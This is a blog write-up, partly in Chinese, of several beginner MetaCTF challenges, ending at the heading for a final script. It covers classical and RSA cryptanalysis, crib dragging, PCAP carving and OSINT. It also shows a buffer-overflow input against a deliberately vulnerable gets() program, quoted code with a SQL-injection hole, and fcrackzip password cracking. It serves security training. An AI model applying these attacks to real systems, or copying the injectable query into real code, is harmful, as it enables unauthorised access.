(MetaCTF{Wren_Gaillard})</span><br><span class="line"> Type: /Metadata</span><br><span class="line">    /Type /Metadata</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<p>My friend wanted to communicate using a secret cipher.</p>
<p>He gave me the message RKPUYPFCIAKKJMYZZJT along with this wheel:</p>
<p><img src="img/metactfimage2.png" alt="image.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line"></span><br><span class="line">outer = string.ascii_uppercase + <span class="string">"{}"</span></span><br><span class="line">inner = <span class="string">"COSDHG{QNFUVWLEZYXPTKMR}ABJI"</span></span><br><span class="line"></span><br><span class="line">msg = <span class="string">"RKPUYPFCIAKKJMYZZJT"</span></span><br><span class="line"></span><br><span class="line">def decrypt(msg, outer, inner):</span><br><span class="line">    <span class="keyword">for</span> rotation <span class="keyword">in</span> range(len(outer)):</span><br><span class="line">        rotated_inner = inner[rotation:] + inner[:rotation]</span><br><span class="line">        lookup = dict(zip(outer, rotated_inner))</span><br><span class="line">        decrypted_msg = <span class="string">""</span>.<span class="built_in">join</span>(lookup[c] <span class="keyword">for</span> c <span class="keyword">in</span> msg)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">'META'</span> <span class="keyword">in</span> decrypted_msg:</span><br><span class="line">            <span class="built_in">print</span>(f<span class="string">"Rotation {rotation}: {decrypted_msg}"</span>)</span><br><span class="line">decrypt(msg, outer, inner)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>Rotation 4: METACTF{WHEELYCOOL}</p>
</blockquote>
<hr>
<p>We intercepted some communications by an enemy cyber actor, and we believe it’s possible to break their encryption scheme. We know they’re using some form of a one-time pad, but fatally, they’re reusing the key across all their messages. We know the group likes classical books, with one of the actors recently being into Charles Dickens, but we don’t have much else to go off of.</p>
<p>Please break these communications to get the password they’ve sent each other!</p>
<p>This tool (or a similar one) might come in handy.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">We intercepted some communications by an enemy cyber actor, and we believe it<span class="string">'s possible to break their encryption scheme. We know they'</span>re using some form of a one-time pad, but fatally, they<span class="string">'re reusing the key across all their messages. We know the group likes classical books, with one of the actors recently being into Charles Dickens, but we don'</span>t have much <span class="keyword">else</span> to go off of. Please <span class="built_in">break</span> these communications to get the password they<span class="string">'ve sent each other!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Encrypted message 1 (hex):</span></span><br><span class="line"><span class="string">e0261e3f44788a669ff87710eb149eba87a9b7ce2abb92b45e862de035485ad02aff59e980e5b0db1657332f202bebb0abe591b6137d93854cddd82ad670caf50431b73fa787741a348e8166791c39ef396c658c1313dac4ac82ff5a948211c9503bb9318376d1a61f45c277ac6ac62e4cdfbf3a40753206b661e4bf4e99575d4253c8feaa6b43eb5b8fc415fa2173c497f0e2573671613aa04d72b5daa5aafcb7fd45850739053965c49016276c733b724e67f976b9ee61a633f95b1286435dc491cec07baf506949f97a56c20870c0b6cfe0e81a96bec40628e407e25d573a35f7c3f9f1af533a363e65b87e7b3948f0d138d2f9e8678e9fc38c83e4202cf00570c386d5fc334314936148efc4fc27db06315d9131fa0455d31e4349a7343ed87f152ace3a1f62552ba00bc36228ef5da754239273453634bdab2a4a6f3c12e3c94b91bbf7c521ca22ff84cb7aac3083a2a252fab727c4f1fcef43d7c32b4f2ba70b32eeefabd1da10980932d3af79c0f8c069ed09f73ef69793ddf7256b6c9473be6ca7907b065e0a0965418fc2daf03abf308c55639d827ea41b4a9a1874b41bfc2cf809083593bda5de46e306e142f9c65716eb1f1670bb8a4367b1920fb5490387b64c9ad105365dd9e812a044a70bfcc5fa6d01ae325aff2db252307c01d54f2d6c8764651a90ab69eb8146ead1c318a952fcd4648764e450f84e7cca18ddb8f0bd0f405a320a3ed8ce79bf0767ea1ed2915664082ad3d7671b59b79b7d9d5a7948952923fc2537fd14a40ac98344fe927adfbf805b39974fb525aeb7dceabcf58c363c04232ede54cfc0f02169ac06293e322d1ccceb1927f3a1c70328226b4dd812ee33df05a1728769167a25e245b58eb5ada6b26b71b0d7cdae8115d950a1824b445fb197e20318d61b69385ff5cc10600419209239735105f3feb09dfcad6b3a42aba213cb997e5cce2e04df6299fefaea04d9fd17819fd24477cf15d1fd0644cafed146175753a166a9344be3a8163fe855c71017b041ef49e2eff087d9de753b4f1518ca989b5f326407f82b0f98ecbdc9b900c075bed589c348d0e0b623658a31ddec507abce8518add4d9b00a847354f000da85303f704e722277102296f2bc62e6a4374d1f9f0ea56923ab84cade47ac393be38adfc67a3db39d29d08e6bc86ab987266618476daba54c678ae48658dc44e37974732347e95448d4b3fd88473df9875304d941f4009accace8bb696c6f266faf681a77b214a35312584c0ef835a0fea60e8eb0b3155908f97601a8596ba846f88ad63c197b266e2730d0b58e3c43262303528e1dbef86</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Encrypted message 2 (hex):</span></span><br><span class="line"><span class="string">ee205b29512bc37692fc7706e1479fe98defe3d22aa5d79f3df464ff70461bd765ab54e2c3e0a6d91103722c2a2bf0bfe6ef97e8137788c856c9c563c179dbbc0a38a133e88f3b1a7d94912e671070eb3d23619e0951c2c9e9d6f11d9acc11d8502abe3f9b3fd5ab5652d424f42bc33105c6b96901633516e225b4990d92165c0407cff7aa225fe2028fcc0fa37661d2d4f6ef46367d7f75b74d37facbeab1feb0af429406751f24728bd55f2724617a592141b178fce424ae33b6595d874218fad8ddc06eed506153a02d58d7086bdda1cff6e31897a8da5222e607cb5956223af5d5f9f1af533a362471b82a2f3348f0cb25d0fff573c792c9c9cbff3f69be577cd6cd8ebd320a07937057b8e4b237d1547a5c9866be0e48c65f455dab79309d3c0429cf680971532cab16df7266ee0fac542b9972006120bda77e58667013ecca4b92b1a3de27c920ab8ec772a46287e0b854a2b73bc4a8abf854c7902f0f67e51929a7c8eb9c9e0a9f1e3487fb65ceaca865f858e170bcde8addf9724f708824be79e790700c43431d654283c49fe721bf338c4963bbd673af0a1894097933ff4831fe40087d91aaa28107f00ba40be7835117e15b506ea88a1734aede08b75e0dcb9600939d513c5dd9eb05ab53ab0befc5f36706e73c1ea964b61a37614dc3003760d36323558cad3aae9940ef82da11bb48af95629c63e50eb153618818dda2ebbe03410e341c77c3c93ab71f34be14d68c186d4778d9da67525db79e35ce1c6252d06e2ffc2f63f708f01f8ad117f4c45a93e7c85d22d053a960e7b089edb6f28c33680f306b8959d9c2a23063ac1a2a70356205d4ef4b3ee1bdda54283e6314857d9406c501a772cb675d2814aa41b595bdb0b2e5736aa09f84bc8134dd56a7a43f6845a5c5b20f2392087d2e4da1c7191f441867a57b22411ec0fce883b4f8782409a7cb5bc9d52a46ce6f13df3094f1fca14bd0a826cf8cd10560c45bd1fa014ed6bad13b22760ca14ea92c47e3bb163ce9448f4302f15ffa1beaecf099d0c8217a431e57c0988344777501bd7c0998ecf8dab90bc46fbf9488c70bd3a3e46c72c530bfd9205deeba718c980c9a02a848674d011ba1194d991ee72627770d6c7864c72f3e4168c0aabfed479222bf1fe0fe36c093ba32adb567ae9a2687910efabcc8ead6057a618461ddb100d878b05f36d9c34d37934e24600d824a975a6dc79a658c896f2308814a5b1afec38fca979bdaf264fbfcd5b37d3e51703661c194f7904b5cfb66f5a50f2d1b8d93d86b0ccb87a08023d8bb75c7d0</span></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://toolbox.lotusfa.com/crib_drag/">https://toolbox.lotusfa.com/crib_drag/</a></p>
<p><img src="img/metactfimage3.png" alt="image.png"></p>
<p><img src="img/metactfimage4.png" alt="image.png"></p>
<p>可以大概猜測是在某段文字中的其中的文字，找到題目說的那位作者，他應該有個書籍包含了缺失的內容</p>
<p><img src="img/metactfimage5.png" alt="image.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">It was the best of <span class="built_in">times</span>, it was the worst of <span class="built_in">times</span>, it was the age of wisdom, it was the age of foolishness, it was the epoch of belief, it was the epoch of incredulity, it was the season of Light, it was the season of Darkness, it was the spring of hope, it was the winter of despair, we had everything before us, we had nothing before us, we were all going direct to Heaven, we were all going direct the other way—<span class="keyword">in</span> short, the period was so far like the present period, that some of its noisiest authorities insisted on its being received, <span class="keyword">for</span> good or <span class="keyword">for</span> evil, <span class="keyword">in</span> the superlative degree of comparison only. There were a king with a large jaw and a queen with a plain face, on the throne of England; there were a king with a large jaw and a queen with a fair face, on the throne of France. In both countries it was clearer than crystal to the lords of the State preserves of loaves and fishes, that things <span class="keyword">in</span> general were settled <span class="keyword">for</span> ever.</span><br></pre></td></tr></table></figure>
<p>大概一片猜測之後</p>
<p><img src="img/metactfimage6.png" alt="image.png"></p>
<blockquote>
<p>MetaCTF{cr1b_dr4gg1ng_7h3_b00k_c1ph3r}</p>
</blockquote>
<hr>
<p>My favorite coffee shop is opening a new website, but they locked it behind a combination lock page! Can you hack the page to get access early?</p>
<p>Access the site <a target="_blank" rel="noopener" href="http://host5.metaproblems.com:7510/">here</a></p>
<p><img src="img/metactfimage7.png" alt="image.png"></p>
<hr>
<p>StackSmashers<br>Welcome to the buffer overflow challenge!</p>
<p>What is a Buffer Overflow?<br>When a program is executed, the CPU processes instructions stored in memory. A stack is an area within memory that is used to store variables, manage function calls, and help control the flow of the program.</p>
<p>When a program receives data from a user, it is stored on the stack in a “buffer”, which is a designated chunk of memory reserved for that data.</p>
<p>A buffer overflow occurs when more data is written to a buffer than it can hold. This extra data can overwrite adjacent memory, potentially leading to unexpected behavior or security vulnerabilities.</p>
<p>Relevant Source Code<br>Take a look at this program. It asks the user to enter a string that will be stored in the buffer section of the memory struct. Note how the buffer can only store 16 bytes.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">void <span class="function"><span class="title">win</span></span>() {</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Congratulations! You've successfully performed a buffer overflow! Here's your flag: FLAG_REDACTED_IN_SNIPPET"</span>);</span><br><span class="line">//The flag has been removed from this version of the code, <span class="keyword">in</span> the real running code, it will be printed when this <span class="keyword">function</span> is called</span><br><span class="line">}</span><br><span class="line">int <span class="function"><span class="title">main</span></span>() {</span><br><span class="line">struct {</span><br><span class="line">char buffer[16];</span><br><span class="line">bool winner;</span><br><span class="line">} memory;</span><br><span class="line">memory.winner = <span class="literal">false</span>;</span><br><span class="line">gets(memory.buffer);</span><br><span class="line"><span class="keyword">if</span> (memory.winner) {</span><br><span class="line">win();</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Try again!\n"</span>);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>How to Solve the Challenge<br>Your goal is to overflow the buffer and set the winner variable to true. The winner variable is located immediately after the buffer in memory. By providing more than 16 characters of input, you can overwrite the winner variable.</p>
<p>Enter your input below to attempt the buffer overflow:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Submit</span><br><span class="line">Memory layout before input:</span><br><span class="line">0000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">0010  00  </span><br><span class="line"></span><br><span class="line">Enter some data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"></span><br><span class="line">Memory layout after input:</span><br><span class="line"></span><br><span class="line">0000  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">0010  41       </span><br><span class="line"></span><br><span class="line">Congratulations! You<span class="string">'ve successfully performed a buffer overflow! Here'</span>s your flag: MetaCTF{h4ving_fun_m4king_pr0f1t}</span><br><span class="line">                                       .</span><br></pre></td></tr></table></figure>
<p>緩衝區溢出就是…丟一堆字串塞下去就對ㄌ</p>
<p><img src="img/metactfimage8.png" alt="image.png"></p>
<blockquote>
<p>MetaCTF{h4ving_fun_m4king_pr0f1t}</p>
</blockquote>
<hr>
<p>We captured network traffic of someone connecting to a file share on a server and writing to a few files.</p>
<p>The flag is in the flag.png file. Find it!</p>
<p>Hint: see if you can isolate the RPC requests that are responsible for writing files to the file system, and pull out the payload of the one that writes flag.png. Copy Bytes as Raw Binary might be helpful, but there are other valid approaches too.</p>
<p>找到這邊有寫入的部分</p>
<p><img src="img/metactfimage9.png" alt="image.png"></p>
<p>如果開啟下面設定能看到更多細節</p>
<p><img src="img/metactfimage10.png" alt="image.png"></p>
<p><img src="img/metactfimage11.png" alt="image.png"></p>
<p>PNG檔案的開頭會有一個特定的簽名，89 50 4E 47 0D 0A 1A 0A</p>
<p><img src="img/metactfimage12.png" alt="image.png"></p>
<p><img src="img/metactfimage13.png" alt="image.png"></p>
<p><img src="img/metactfimage14.png" alt="image.png"></p>
<blockquote>
<p>MetaCTF{th3_n3tw0rk_is_th3_c0mput3r}</p>
</blockquote>
<hr>
<p>My friend went camping near some beautiful lake the other day and sent me a photo, but they refuse to tell me where it was!</p>
<p>Can you help me figure out the name of that lake?</p>
<p>Simply enter the name of the lake as the flag. It does not need to be in the MetaCTF{} format.</p>
<p><img src="img/metactfimage15.png" alt="image.png"></p>
<p><img src="img/metactfimage16.png" alt="image.png"></p>
<hr>
<p>I’m trying to log into my online crypto wallet, but I forgot my password! There’s no password reset feature, and I can’t reach support.</p>
<p>Can you help me log in and get the flag? My username is jim404.</p>
<p>You can download the source code here. Looks like there might be an issue with how the user input is injected into the SQL query.</p>
<p><img src="img/metactfimage17.png" alt="image.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request, render_template</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import sqlite3</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">os.chdir(os.path.dirname(os.path.realpath(__file__)))</span><br><span class="line"></span><br><span class="line">db = sqlite3.connect(<span class="string">"db.sqlite"</span>, check_same_thread=False)</span><br><span class="line">db_cursor = db.cursor()</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">@app.route(<span class="string">'/index.html'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def index():</span><br><span class="line">    <span class="built_in">return</span> render_template(<span class="string">"index.html"</span>)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/login'</span>, methods=[<span class="string">'POST'</span>])</span><br><span class="line">def login():</span><br><span class="line">    data = request.json</span><br><span class="line">    username = data.get(<span class="string">"username"</span>, <span class="string">"-"</span>)</span><br><span class="line">    password_hash = hashlib.md5(data.get(<span class="string">"password"</span>, <span class="string">"-"</span>).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    db_error = <span class="string">""</span></span><br><span class="line">    try:</span><br><span class="line">        query = <span class="string">"SELECT username, public_btc_address, private_btc_key, balance FROM users WHERE username='"</span> + username + <span class="string">"' AND password_hash='"</span> + password_hash + <span class="string">"';"</span></span><br><span class="line">        result = db_cursor.execute(query)</span><br><span class="line">        user_data = result.fetchone()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        user_data = None</span><br><span class="line">        db_error = str(e)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> user_data is None:</span><br><span class="line">        <span class="built_in">return</span> {</span><br><span class="line">            <span class="string">"error"</span>: True,</span><br><span class="line">            <span class="string">"message"</span>: <span class="string">"Login failed. Please try again."</span>,</span><br><span class="line">            <span class="string">"debug"</span>: query,</span><br><span class="line">            <span class="string">"debug_msg"</span>: db_error,</span><br><span class="line">        }</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> {</span><br><span class="line">            <span class="string">"error"</span>: False,</span><br><span class="line">            <span class="string">"message"</span>: <span class="string">"Login successful."</span>,</span><br><span class="line">            <span class="string">"username"</span>: user_data[0],</span><br><span class="line">            <span class="string">"public_btc_address"</span>: user_data[1],</span><br><span class="line">            <span class="string">"private_btc_key"</span>: user_data[2],</span><br><span class="line">            <span class="string">"balance"</span>: user_data[3]</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">app.run(debug=True, host=<span class="string">"0.0.0.0"</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li><p>The SQL query is constructed like this:</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line">query = <span class="string">"SELECT username, public_btc_address, private_btc_key, balance FROM users WHERE username='"</span> + username + <span class="string">"' AND password_hash='"</span> + password_hash + <span class="string">"';"</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>User-supplied values (<code>username</code> and <code>password</code>) are concatenated directly into the query string, making it vulnerable to SQL Injection.</li>
</ul>
</li>
<li>The application does not validate or sanitize input, so malicious input could manipulate the SQL query to bypass authentication.</li>
</ul>
<p><img src="img/metactfimage18.png" alt="image.png"></p>
<p><img src="img/metactfimage19.png" alt="image.png"></p>
<hr>
<p>I need to get into this <a target="_blank" rel="noopener" href="https://metaproblems.com/d36b89698928224c03f29aa2d2cb5544/luggage.zip">archive</a>, but I forgot the password for it as well. All I remember is, it’s the same 4-digit pin I used on my luggage lock…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/kali/Desktop]</span><br><span class="line">└──╼ <span class="comment">#fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt luggage.zip </span></span><br><span class="line">found file <span class="string">'flag.txt'</span>, (size <span class="built_in">cp</span>/uc     68/    56, flags 1, chk f38c)</span><br><span class="line">                        </span><br><span class="line">PASSWORD FOUND!!!!: pw == 7123</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="img/metactfimage20.png" alt="image.png"></p>
<hr>
<p>What’s better than RSA? 1024 runs of RSA!</p>
<p>We encrypted the flag using <a target="_blank" rel="noopener" href="https://metaproblems.com/b7efc6dbe8b30f0d5d1a1f333297fbda/loopy_primes.py">this program</a>, and the output from running the program with the <a target="_blank" rel="noopener" href="https://metaproblems.com/b7efc6dbe8b30f0d5d1a1f333297fbda/output.txt">flag</a> is available here.</p>
<p>Can you figure out what the original flag was?</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from secrets import FLAG</span><br><span class="line">from Crypto.Util.number import bytes_to_long, getPrime</span><br><span class="line">from sympy import nextprime </span><br><span class="line"></span><br><span class="line">E = 65537</span><br><span class="line">LOOPS = 1024</span><br><span class="line">keysize = 512</span><br><span class="line">pt = bytes_to_long(FLAG)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,LOOPS):</span><br><span class="line">    <span class="comment">#print(f"pt {i}: {pt}")</span></span><br><span class="line">    p = getPrime(keysize)</span><br><span class="line">    q = nextprime(p)</span><br><span class="line">    n = p*q</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">"n {i}: {n}"</span>)    </span><br><span class="line">    ct = pow(pt, E, n)</span><br><span class="line">    pt = ct</span><br><span class="line">    keysize+=1</span><br><span class="line">    <span class="keyword">if</span> i == LOOPS - 1:</span><br><span class="line">        <span class="built_in">print</span>(f<span class="string">"ct {i}: {ct}"</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n 0: 58925408247237150718853020288660614964885937087443374494748117153321454897494106350365153437207431995046188449566482398926564680325766021705291969671142407537893105626964976326911173444535099436796060713319386867699316931662339127118126085249539191718287895359339838418358971997170530525806189319780925594989</span><br><span class="line">n 1: 420074976683378657854469830084952452166331743473055570014564677217278678109354411673745923344406469209476033895602263472721449067395081686757235932197766820144127698660254630004481280733415500804393235136927892534076667879707641538667404654805572048375580943632117170785312674084495314753014227063390393253971</span><br><span class="line">n 2: 1559230717146436704258126658878594303835854678919760985172436714506910746263901891106710743493961990464628191090502846776956568264866565700228335235919370966430208637927737297040638052365863727774078564524547976902060128879221804567894768562590230275602281461418831077416735526836794895469692918002247920633673</span><br><span class="line">...</span><br><span class="line">n 1023: 1267919874988366294824754036502102253839007260324431994159563506150527737933721534242973396801528291782062435156001060576106259511187851542673154260334449420573811437511601222626257814850849868036401038254780655406667342662783075675279348081527412407589891876965829954443294919002205278574238340766902606903158754281519494495397829601214540036573007092747269897782321207910274243316347055831965232371918023374086760818426747875311906362251077679481154945695895158664896692153216729025599558239510433848932913871051008234150319960025234545082490863672396770851851918839344920597177301535559330640371198784781384359811154106580798863751965711939656904877044064901234472152935884199640782746451197646516806025000456914468223373262814803272461933323590514938198921544799815384261380125390232828732845529684619654493045148743805154302299521722285312469243036133945037149086165761003738705967996780136020932374602666380997736858769</span><br><span class="line"></span><br><span class="line">ct 1023: 1250021393696525786335144361256414392593842741899479026585356065981817277181288068914492467448549175876062630331679179355487465372606959563984767504620720255739774332272265642671917705941701114225469036166567594052827968764499243560382703470425820431311019975034026645239723973080187014930125726065276819489811844274205868050933689117304876596915537920549094830768541674984384367985548037483091618223908344579452561631433297832894343244227860114298682044575901262345754528530201542566101805629757559712992093692264025791932530650085361520370720560897345946878375718294804530566609217693927191949845442274139788083823261127745109253437341146676011790218622001363252912102009978815070618838677527704373445935401007981220691357785265074004747715150454051491489944469565489921680045495525795924651018931270447789984693706499550173787891272109393797400115911729509755305600161994934603465525212582074265397044150982115224461467939</span><br></pre></td></tr></table></figure>
<p>需要先把n,ct從網站提取出來</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">URL = <span class="string">"https://metaproblems.com/b7efc6dbe8b30f0d5d1a1f333297fbda/output.txt"</span></span><br><span class="line">OUTPUT_FILE = <span class="string">"output_data.txt"</span></span><br><span class="line"></span><br><span class="line">def fetch_data(url):</span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == 200:</span><br><span class="line">        <span class="built_in">return</span> response.text</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> None</span><br><span class="line"></span><br><span class="line">def extract_n_and_ct(data):</span><br><span class="line">    n_pattern = re.compile(r<span class="string">"n \d+: (\d+)"</span>)</span><br><span class="line">    ct_pattern = re.compile(r<span class="string">"ct \d+: (\d+)"</span>)</span><br><span class="line">    </span><br><span class="line">    n_values = n_pattern.findall(data)</span><br><span class="line">    ct_values = ct_pattern.findall(data)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">return</span> n_values, ct_values</span><br><span class="line"></span><br><span class="line">def save_to_file(n_values, ct_values, filename):</span><br><span class="line">    with open(filename, <span class="string">"w"</span>) as f:</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> n_values:</span><br><span class="line">            f.write(f<span class="string">"{n}\n"</span>)</span><br><span class="line">        <span class="keyword">for</span> ct <span class="keyword">in</span> ct_values:</span><br><span class="line">            f.write(f<span class="string">"{ct}\n"</span>) </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    data = fetch_data(URL)</span><br><span class="line">    <span class="keyword">if</span> not data:</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    n_values, ct_values = extract_n_and_ct(data)</span><br><span class="line">    save_to_file(n_values, ct_values, OUTPUT_FILE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="RSA-Encryption-and-Decryption-Process"><a href="#RSA-Encryption-and-Decryption-Process" class="headerlink" title="RSA Encryption and Decryption Process:"></a>RSA Encryption and Decryption Process:</h3><ol>
<li><p><strong>RSA Setup:</strong></p>
<ul>
<li><strong>Public Key</strong>: The public key is composed of two parts: <code>E</code> (the exponent) and <code>n</code> (the modulus, which is the product of two large prime numbers <code>p</code> and <code>q</code>).</li>
<li><strong>Private Key</strong>: The private key is <code>d</code> (the private exponent), computed using Euler’s Totient Function <code>φ(n)</code>, where <code>φ(n) = (p - 1) * (q - 1)</code>.</li>
</ul>
</li>
<li><p><strong>Encryption:</strong></p>
<ul>
<li>To encrypt the message (which is the flag in this case), the plaintext message is first converted into an integer <code>pt</code>.</li>
<li><p>The encryption is then done using the formula:</p>
<p><strong>Ciphertext</strong> (<code>ct</code>) = <code>pt^E % n</code></p>
<p>Here, <code>E</code> is a fixed public exponent (commonly <code>65537</code>), and <code>n</code> is the product of two large primes <code>p</code> and <code>q</code>.</p>
</li>
</ul>
</li>
<li><p><strong>Decryption:</strong></p>
<ul>
<li><p>To decrypt, the private exponent <code>d</code> is required. It’s computed as the modular inverse of <code>E</code> modulo <code>φ(n)</code>:</p>
<p><strong>Private exponent</strong> (<code>d</code>) = <code>E^-1 % φ(n)</code></p>
</li>
<li><p>The original message is recovered using the formula:</p>
<p><strong>Plaintext</strong> (<code>pt</code>) = <code>ct^d % n</code></p>
</li>
</ul>
</li>
<li><p><strong>Multiple Encryption Steps:</strong></p>
<ul>
<li>The flag is encrypted multiple times (specifically 1024 times), with each encryption step involving a new pair of primes <code>p</code> and <code>q</code>. Each new pair generates a new <code>n</code> value.</li>
<li>In each step, the ciphertext from the previous encryption is used as the plaintext for the next encryption. This chaining process makes it more difficult to decrypt.</li>
<li>To recover the original flag, you need to reverse the process starting from the final ciphertext and work backwards, applying the private key <code>d</code> in each step to eventually retrieve the original plaintext.</li>
</ul>
</li>
</ol>
<h3 id="Key-Observations"><a href="#Key-Observations" class="headerlink" title="Key Observations:"></a><strong>Key Observations:</strong></h3><ol>
<li><p><strong>Each <code>n</code> is the product of two primes, <code>p</code> and <code>q</code></strong>, and these are different for each encryption step.</p>
<p> However, unlike traditional RSA, the primes aren’t chosen randomly each time. They are close enough to each other that certain factoring techniques can work.</p>
</li>
<li><p><strong>Each step only needs to “undo” the encryption from the previous step</strong>. This is where the main challenge lies. You have to find the right way to reverse each encryption process.</p>
</li>
</ol>
<h3 id="The-Attack-Process"><a href="#The-Attack-Process" class="headerlink" title="The Attack Process:"></a><strong>The Attack Process</strong>:</h3><p>Here’s a rephrased explanation of the process to reverse the RSA encryption chain, formatted for better compatibility with your Hexo site:</p>
<hr>
<h3 id="Reversing-the-RSA-Encryption-Chain"><a href="#Reversing-the-RSA-Encryption-Chain" class="headerlink" title="Reversing the RSA Encryption Chain:"></a>Reversing the RSA Encryption Chain:</h3><p>To recover the original flag, we need to reverse the encryption process, which involves the following steps:</p>
<ol>
<li><p><strong>Extract the Moduli (<code>n</code>)</strong>:</p>
<ul>
<li>The challenge provides a list of the moduli <code>n</code> used during each encryption step (found in <code>output_data.txt</code>). These moduli are the result of multiplying two prime numbers <code>p</code> and <code>q</code>.</li>
</ul>
</li>
<li><p><strong>Factorizing <code>n</code></strong>:</p>
<ul>
<li><p>In traditional RSA, factoring <code>n</code> into its prime factors <code>p</code> and <code>q</code> is computationally difficult. However, because the primes <code>p</code> and <code>q</code> are chosen to be close to each other, we can use <strong>Fermat’s Factorization Method</strong> to efficiently factor <code>n</code>. This method is based on the difference of squares formula:</p>
<p><code>n = (a + b)(a - b)</code></p>
<p>Here, <code>a</code> and <code>b</code> are integers derived from <code>n</code>.</p>
</li>
</ul>
</li>
<li><p><strong>Reversing the Encryption</strong>:</p>
<ul>
<li><p>Once we have factored <code>n</code> into <code>p</code> and <code>q</code>, we can calculate the Euler’s Totient Function <code>φ(n)</code> using the formula:</p>
<p><code>φ(n) = (p - 1) * (q - 1)</code></p>
</li>
<li><p>Then, we calculate the private key exponent <code>d</code> by finding the modular inverse of <code>E</code> (the public exponent) modulo <code>φ(n)</code>:</p>
<p><code>d = E^-1 mod φ(n)</code></p>
</li>
<li><p>With the private key <code>d</code>, we can decrypt the ciphertext at each step using the formula:</p>
<p><code>ct = ct^d mod n</code></p>
<p>This will recover the plaintext for that encryption step, which is then passed as the ciphertext to the next decryption step. We continue this process for all 1024 encryption steps, progressively recovering the original plaintext.</p>
</li>
</ul>
</li>
<li><p><strong>Recovering the Flag</strong>:</p>
<ul>
<li>By applying the decryption steps in reverse order, we eventually recover the original plaintext, which is the flag.</li>
</ul>
</li>
</ol>
<h3 id="Code-Implementation-Steps"><a href="#Code-Implementation-Steps" class="headerlink" title="Code Implementation Steps:"></a><strong>Code Implementation Steps</strong>:</h3><ol>
<li><p><strong>Load the Moduli (<code>n</code>)</strong>: Extract the moduli used in the RSA encryptions from <code>output_data.txt</code>. The moduli are stored as integers.</p>
</li>
<li><p><strong>Factor Each Modulus <code>n</code></strong>: Apply Fermat’s Factorization method to break each <code>n</code> into its prime factors <code>p</code> and <code>q</code>.</p>
</li>
<li><p><strong>Calculate <code>φ(n)</code></strong>: After extracting <code>p</code> and <code>q</code> from <code>n</code>, compute the Euler’s Totient Function <code>φ(n)</code> using the formula <code>φ(n) = (p - 1) * (q - 1)</code>.</p>
</li>
<li><p><strong>Compute the Private Exponent <code>d</code></strong>: Using <code>φ(n)</code>, calculate the modular inverse of <code>E</code> to obtain the private exponent <code>d</code>.</p>
</li>
<li><p><strong>Decrypt Each Step</strong>: Start with the final ciphertext and apply the RSA decryption formula <code>ct = ct^d mod n</code> for each encryption step, working backward through all the steps.</p>
</li>
<li><p><strong>Recover the Flag</strong>: After completing all the decryption steps, convert the final plaintext to bytes, revealing the flag.</p>
</li>
</ol>
<p>最後腳本</p>
